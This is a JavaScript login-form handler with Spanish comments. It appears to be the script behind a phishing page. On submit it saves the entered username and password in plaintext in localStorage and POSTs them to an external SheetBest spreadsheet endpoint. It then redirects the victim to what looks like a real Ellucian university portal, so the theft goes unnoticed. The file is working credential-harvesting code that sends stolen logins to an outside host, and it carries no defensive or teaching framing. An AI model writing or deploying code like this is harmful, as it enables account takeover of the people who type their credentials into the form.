document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    const errorMessage = document.getElementById('errorMessage');
    
    // Verificar credenciales guardadas (solo para autocompletar)
    if(localStorage.getItem('rememberMe') === 'true') {
        const savedUsername = localStorage.getItem('username');
        const savedPassword = localStorage.getItem('password');
        
        if(savedUsername && savedPassword) {
            document.getElementById('username').value = savedUsername;
            document.getElementById('password').value = savedPassword;
            document.getElementById('remember').checked = true;
        }
    }
    
    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const rememberMe = document.getElementById('remember').checked;
        
        // Guardar en localStorage si "Recordarme" está marcado
        if(rememberMe) {
            localStorage.setItem('username', username);
            localStorage.setItem('password', password);
            localStorage.setItem('rememberMe', 'true');
        } else {
            localStorage.removeItem('username');
            localStorage.removeItem('password');
            localStorage.removeItem('rememberMe');
        }
        
        try {
            // Opcional: Guardar datos en SheetBest (sin validación)
            const sheetBestWriteUrl = 'https://api.sheetbest.com/sheets/e5255e90-537f-4faa-a09b-e72d3e94ebea';
            await fetch(sheetBestWriteUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    usuario: username,
                    contrasena: password,
                    fecha_acceso: new Date().toISOString()
                })
            });
            
            // Redirección directa a Google
            window.location.href = 'https://experience.elluciancloud.com/sndaetis/';
            
        } catch (error) {
            console.error('Error al guardar datos (la redirección ocurrirá de todos modos):', error);
            window.location.href = 'https://experience.elluciancloud.com/sndaetis/'; // Redirección incluso si falla SheetBest
        }
    });
    
    // Función para mostrar errores (no se usará en este flujo)
    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
    }
});


